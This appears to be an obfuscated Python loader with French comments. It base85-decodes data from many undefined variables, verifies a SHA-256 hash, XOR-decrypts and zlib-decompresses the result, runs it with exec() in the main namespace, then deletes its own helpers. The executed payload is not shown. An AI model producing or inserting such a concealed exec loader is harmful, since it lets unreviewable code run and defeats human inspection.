_padbyFK0KeMRDU = __import__('base64').b85decode(_cjR5douZtO3fNA + _cbx1L_xsLNSgXH + _csNMkSTP2C4n6S + _cldg20Ah3KnKl2 + _cw5Q7JfXQEROYK + _cwhj1VCIlSzmeH + _caFPiuDmnztTJS + _cm5UGt50xxqwYS + _cvJ_9dSvrkUbCu + _cgonNBjjRk4BiT + _c_pdfIpYf2ugYd + _cljCj23tGkLa45 + _ccQVdt0e0yotIS + _ccaXJWdsD6GYC2 + _coLT9AqITRdP4B + _cwVJhN2xbnUG2x + _ca1LxTCgdHfCKV + _cgW0izQMkH1wZn + _cl3NBT2t_YYsDH + _cm2ZKSlNXbaHQY + _cmxxmhH_tJtSnF + _cuoQJRkcwB90AP + _cqqxPYGh9Q65iq + _ciArtwIp6W2C3Z + _cotKB_tikMu7XG + _c_rSmzR6Eu847l + _ct_7bbfmK9odTg + _cak_ru8lv5ZokB + _cvFt_nfwTxQEce + _chSJ_x3dsxyjqx + _cgm6KcopnvpCap + _cv2IjaSKouMfo7 + _cdKPG7YAzMKQ6F + _cj1Qa8QSBKtXrz + _cpcR7BtCzByLmv + _cco6FdNvh12Mu2 + _cySNS6BuiCWy4D + _ca4jnZx7Xpeis4 + _clmJquvuu3oe5Z + _cf_pSwsEHaFHjl + _ceFZLc_x8WKKx4 + _ciwCqIhBd0a2Ws + _cq55edoru5WwT7 + _caTULhq0JpOp9E + _chkvks8FCpHdJd + _cxO62oGwRaWXuM + _cbwFajIUnuav9C + _cwkIowl8NacTDT + _cto_VTtXYEw0qL + _cfvKan8rC5fOmd + _cuPhHSqlB7UpL2 + _ctnm95Ql8l1ymj + _czSADjCiURpFwZ + _cnP_a4Wdwatvqg + _crgBwDKfWUAQol + _cphyBg1BYd3i8L + _c_EeCpsTVLkkCB + _ciGUTKq3rsQSAQ + _cvspfuWPn_7H_P + _cbKmZyEhcXaxGN + _crpwvhJzjkU7r7 + _copizSJpKnaizy + _caAZBqyJXcIP8w + _coY65t1SMCKjfs + _cqq8cVuLVLc79l + _csVB0CEb9NoPDe + _cemCeyr0meDNxC + _cddcY1pdVLqq3W + _cfGXXAUOAyY34B + _cvaTWm7MsEhodk + _cnYDj1RIrP0Jr4 + _cax6iNRTp5diIz + _cwQm0G_DrbiazW + _cc4YvNZY4IcbWJ + _cgxJDKUHfdhh2q + _cb54fXtvTWCaIM + _ceKK0EYWyaxkiL + _caiuD6UVJyqP7n + _caS60AbkLW4Llf + _cwsXfvE6vToJg2 + _ce_W8WgiE3XBIN + _cmT2_quF29OVAe + _cjtBEQdZU0FQdL + _coagute4BgAiV8 + _cuYk01QQirpTpt + _cjIjsMLdDXpW_u + _ci94r1OcnUQWmb + _cxpI2L48kU5L2H + _cpNqCQdRndWd87 + _cgdvGzuqDoQHIf + _c_jvon1FPExK92 + _cqmiEnL35DDDCy + _cgKbasPAEhZlHg + _coIHzIP1O_06Qb + _cu379HKgfOrJ0r + _cfn01QUYBET1x1 + _cz4dycob0eYYLR + _cqfVB2ElI3C7TH + _cxWIFviBlUloaD + _cqZAVBqIhcLgkU + _cxMgv3nWPToG1h + _cdqulmorHNe21F + _cjiypmRRPNW3Eu + _cdzTdEKDwmlBWk + _cwlwtkT2JvJ372 + _coFO2ePWW5swYQ + _cusxA3YIN5ToJ7 + _cmcisF5dwt4Kug + _cbwAGTmH2T1G6T + _cjpIaszGTPtOKM + _cjp5UwV5xz4dMW + _cx0XoN0iVPX0HJ + _cp2LziMt1qjDFP + _chGxjmzNhGUdYm + _cmC9_J4p61uzvX + _clKMEXt5PkRcl0 + _ccqpo0vJhBfSOc + _cdUEGzGra06Lly + _ccNHrm4WCDAmlS + _ca4uCNyZCqzaf4 + _ccxIQAW3AxdcEf + _clPHTL0Wku6YQI + _cejJHSLSyKVYfr + _cn9fZNP4kULtEa + _cvbyrdOJPExdBn + _cqwqm65gXhCpoD + _ctYLAHx9TbwnaF + _clyKXBmN8SbuTt + _coLixp869AhBVy + _cat26bw4qaR4Yv + _coiFPChS1TCoF2 + _cnsUDXK6qRK3Ep + _cqx2RqJrba6wmX + _caP20AH4YHxsrS + _cnRr_vXr0JSYbr + _czNL2GIphHsAnR + _cc4SESO5mxmfsT + _cuBIypD6zMvRyy + _c_W3I5uII9eoqg + _ckAPFdezeOAg7s + _cy2p0CiYpCQsIz + _cvcqLcb0UNLfu2 + _ctryW9I_jInUNV + _cb0MR0aYiJn1LM + _cqAThaGiuRvCTT + _crigN3Iyk2NpNy + _cuw_xKL9iSiFBl + _cywW9MjEdIQ4QH + _cmiceKrPN9TS8u + _ct3423yTrCaIDP + _claFJXWnoPH0oW + _cqGHLo0THuBxt9 + _cnY36Qynw0fnoA + _clZyqftkmUQCNW + _cr_o93frPHmBvr + _cgSwiwFV_QbUyj + _cj5Xf783KSqeRd + _cdXvsCsuEeEn59 + _cmi83IkcMaNW_k + _cwPKqrvIEqo_S5 + _cxz6j2afP1_L14 + _ci1q4kBYBJnSlB + _cgeRC3YOem2LRw + _cklh2bjzCs2_O4 + _caAq8kGuTvZev5 + _cj5uG3163bapgP + _chgccNkuxCM5LG + _cjbRSMYPul7O1x + _cuo0KhkiqRwBKi + _csQx_4dLTiCQuY + _cwmn8JbE8rNzII + _cbZzOIVuQ1DTtg + _cqn8CgnA3LZca6 + _c_uM4u79uTMIPu + _coilHxUCGj4zKK + _cnB7znInW0xgiY + _cgdc3DbJKwE31n + _ciK1DjL9MLzXTG + _coedDA00XYdfVq + _caiR2puhE0FiBT + _cw3LhmMx01d8Z0 + _cscbftTqmboSXb + _cpn9dCPjPgRNkJ + _cg1sx24CsAmKA4 + _csIS7fO16HS3I0 + _cyh232lA1KUkpY)
if __import__('hashlib').sha256(_padbyFK0KeMRDU).hexdigest() != 'cf95a69569ea7f6d2d41679ad5931fe8b98fbd1cb03e3ff8846873e120f96445':
    __import__('sys').exit(1)
_xuXZ7gn88VgEj0 = bytes([102, 171, 193, 95, 97, 184, 46, 161, 180, 15])
_fktID75KktL0xRa = bytes([57, 246, 134, 65, 41, 90, 204, 171, 45, 173])

def _fxfZwU2evffqyGn(_biIVap4v6EcNBy, _kuEv5ZU6Aw7ihU):
    return bytes(_biIVap4v6EcNBy[_irYb2JRhvNkvh_] ^ _kuEv5ZU6Aw7ihU[_irYb2JRhvNkvh_ % len(_kuEv5ZU6Aw7ihU)] for _irYb2JRhvNkvh_ in range(len(_biIVap4v6EcNBy)))

def _fdxvClCJAHiJHiE(_teLdz44J3YwpA0):
    import zlib
    return zlib.decompress(_teLdz44J3YwpA0) # Un seul niveau de zlib ici pour simplifier

def _fexqf_YfD0XE__N():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xlq_IH03FLCSW8 = _fxfZwU2evffqyGn(_padbyFK0KeMRDU, _xuXZ7gn88VgEj0)
    # 2. Décompression Zlib
    _dqii92bes1DJck = _fdxvClCJAHiJHiE(_xlq_IH03FLCSW8)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dqii92bes1DJck.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nlneQ767EMv46G = _main.__dict__
    _nlneQ767EMv46G.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nlneQ767EMv46G)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fexqf_YfD0XE__N()
try:
    del _fxfZwU2evffqyGn, _fdxvClCJAHiJHiE, _fexqf_YfD0XE__N
    del _padbyFK0KeMRDU, _xuXZ7gn88VgEj0, _fktID75KktL0xRa
except:
    pass
